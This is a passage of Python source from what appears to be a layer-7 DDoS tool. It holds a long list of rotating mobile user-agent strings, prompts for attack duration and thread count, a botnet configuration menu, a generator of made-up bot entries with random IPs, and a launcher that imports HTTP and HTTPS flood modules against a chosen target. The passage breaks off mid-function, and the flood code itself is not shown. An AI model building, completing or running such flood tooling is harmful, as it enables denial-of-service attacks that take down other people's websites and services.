        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.8 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.7 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.6 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.5 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 16_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 15_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.8 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.7 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.6 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 14_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.5 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36"
    ]
    import random
    return random.choice(user_agents)

def get_attack_settings():
    print()
    print("  " + RED + "ATTACK SETTINGS" + RESET)
    print()

    settings = {}

    while True:
        try:
            print()
            print("  " + GRAY + "Duration Configuration:" + RESET)
            duration_input = input("  ➤ " + GRAY + "Duration in seconds (default 60): " + RESET).strip()
            settings["duration"] = int(duration_input) if duration_input else 60
            if settings["duration"] < 1:
                print("\n" + RED + "  [!] Error: Duration must be at least 1 second!" + RESET)
                continue
            break
        except ValueError:
            print("\n" + RED + "  [!] Error: Please enter a valid number!" + RESET)

    while True:
        try:
            print()
            print("  " + GRAY + "Thread Configuration:" + RESET)
            print("  " + GRAY + "  Recommended: 1-10 for testing, 10-50 for load test" + RESET)
            threads_input = input("  ➤ " + GRAY + "Number of threads (default 50): " + RESET).strip()
            settings["threads"] = int(threads_input) if threads_input else 50
            if settings["threads"] < 1:
                print("\n" + RED + "  [!] Error: Threads must be at least 1!" + RESET)
                continue
            break
        except ValueError:
            print("\n" + RED + "  [!] Error: Please enter a valid number!" + RESET)

    settings["delay"] = 0

    while True:
        print()
        print("  " + GRAY + "User-Agent Configuration:" + RESET)
        print("  " + GRAY + "  1. Random User-Agent" + RESET)
        print("  " + GRAY + "  2. Custom User-Agent" + RESET)
        print("  " + GRAY + "  3. Default User-Agent" + RESET)
        ua_choice = input("  ➤ " + GRAY + "Select option (default 1): " + RESET).strip() or "1"

        if ua_choice == "1":
            settings["user_agent"] = "random"
            print("  " + RED + "[+] Random User-Agent selected" + RESET)
            break
        elif ua_choice == "2":
            custom_ua = input("  ➤ " + GRAY + "Enter custom User-Agent: " + RESET).strip()
            if custom_ua:
                settings["user_agent"] = custom_ua
                print("  " + RED + "[+] Custom User-Agent set" + RESET)
                break
            else:
                print("\n" + RED + "  [!] Error: User-Agent cannot be empty!" + RESET)
                continue
        elif ua_choice == "3":
            settings["user_agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            print("  " + RED + "[+] Default User-Agent selected" + RESET)
            break
        else:
            print("\n" + RED + "  [!] Invalid option!" + RESET)
            continue

    print()
    print("  " + RED + "Attack Configuration Summary:" + RESET)
    print("    Duration: " + str(settings['duration']) + "s")
    print("    Threads: " + str(settings['threads']))
    print("    Delay: " + str(settings['delay']) + "ms")
    ua_display = settings['user_agent'] if settings['user_agent'] != "random" else "Random"
    if len(ua_display) > 50:
        ua_display = ua_display[:47] + "..."
    print("    User-Agent: " + ua_display)
    print()

    return settings

def print_botnet_menu():
    print()
    print("  " + RED + "BOTNET CONFIGURATION" + RESET)
    print()
    print("    1. Add Bot")
    print("    2. Generate Random Bots (Custom)")
    print("    3. Generate 5 Random Bots")
    print("    4. Sync Bots from bot.py")
    print("    5. List Bots")
    print("    6. Remove Bot")
    print("    7. Bot Statistics")
    print("    8. Back to Main Menu")
    print()

def generate_random_bots(count=5):
    import random
    countries = ["US", "DE", "FR", "UK", "NL", "RU", "BR", "IN", "JP", "CA", "AU", "RO"]
    generated_bots = []
    for i in range(count):
        ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
        location = random.choice(countries)
        latency = random.randint(10, 200)
        generated_bots.append({
            "ip": ip,
            "status": "online",
            "location": location,
            "latency": latency
        })
    return generated_bots

def get_botnet_settings():
    print()
    print("  " + RED + "BOTNET SETTINGS" + RESET)
    print()
    try:
        bot_count = int(input("  ➤ " + GRAY + "Number of bots: " + RESET))
        distribution = input("  ➤ " + GRAY + "Distribution method (round-robin/random): " + RESET).strip() or "random"
        proxy = input("  ➤ " + GRAY + "Use proxy (yes/no, default no): " + RESET).strip().lower() or "no"
        return {
            "bot_count": bot_count,
            "distribution": distribution,
            "proxy": proxy == "yes"
        }
    except ValueError:
        print("\n" + RED + "  [!] Error: Please enter valid numbers!" + RESET)
        return None

def run_layer7_attack(attack_type, target, settings, bots):
    print()
    print("  " + RED + "ATTACK INITIATED" + RESET)
    print()
    print("  " + GRAY + f"Attack Type: " + RESET + f"{attack_type}")
    print("  " + GRAY + f"Target: " + RESET + f"{target}")
    print("  " + GRAY + f"Duration: " + RESET + f"{settings['duration']}s")
    print("  " + GRAY + f"Threads: " + RESET + f"{settings['threads']}")
    print("  " + GRAY + f"Active Bots: " + RESET + f"{len(bots)}")
    print("  " + GRAY + f"Delay: " + RESET + f"{settings['delay']}ms")

    if settings.get('user_agent') == 'random':
        ua = get_random_user_agent()
        settings['user_agent'] = ua
        print("  " + GRAY + f"User-Agent: " + RESET + (f"{ua[:50]}..." if len(ua) > 50 else f"{ua}"))
    else:
        ua_display = settings['user_agent'] if len(settings['user_agent']) <= 50 else settings['user_agent'][:47] + "..."
        print("  " + GRAY + f"User-Agent: " + RESET + f"{ua_display}")

    print("  " + GRAY + f"Live RPS: " + RESET + f"Updating every second")
    print()

    log_attack(attack_type, target, settings, status="started")

    if attack_type == "HTTP Flood":
        try:
            sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'layer7'))
            from http_flood import start_attack
            start_attack(target, settings, bots)
            log_attack(attack_type, target, settings, status="completed", details={"message": "HTTP Flood finished"})
        except ImportError:
            print(RED + "  [!] Error: http_flood.py not found in layer7 folder" + RESET)
            log_attack(attack_type, target, settings, status="failed", details={"error": "http_flood.py not found"})
    elif attack_type == "HTTPS Flood":
        try:
            sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'layer7'))
            from https_flood import start_attack
